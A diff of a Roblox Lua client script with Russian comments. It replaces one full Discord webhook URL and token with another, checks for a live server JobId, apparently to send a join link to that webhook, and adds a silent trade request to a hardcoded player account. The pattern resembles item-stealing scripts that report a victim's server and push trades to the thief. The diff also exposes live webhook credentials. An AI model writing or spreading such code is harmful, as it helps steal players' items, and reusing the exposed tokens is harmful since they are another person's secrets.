@@ -1,8 +1,10 @@
-local webhookUrl = "https://discord.com/api/webhooks/1564766433466912849/wymKnn-UzPAYt9MLsWahCWY4hOM6FEqlozeIMvfhB1o4jD7MbvzP1LGur331jNI6-NSK"
+-- ⚠️ Не публикуй этот URL. Замени на свой.
+local webhookUrl = "https://discord.com/api/webhooks/1566534128218804466/KMXt1caKqnxCvjDQLmS9R9QTzO5AaJxwqRpRsGLYdDZ2Gg75jx5IXsUwRZ9ROUdR9egJ"
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- 1. Проверяем окружение: скрипт должен работать на клиенте
 local LocalPlayer = Players.LocalPlayer
@@ -18,6 +20,12 @@ if not jobId or jobId == "" then
     warn("[webhook] JobId пуст — вероятно, запущено в Studio. Ссылка не будет работать.")
     return
 end
+
+-- 2.1. Отправляем запрос на сервер (твой фрагмент)
+local Event = ReplicatedStorage.Trade.SendRequest
+pcall(function()
+    Event:InvokeServer(Players.Marie_31113)
+end)
 
 -- 3. Название игры (с защитой от ошибок, если игра недоступна)
 local gameName = "Неизвестная игра"
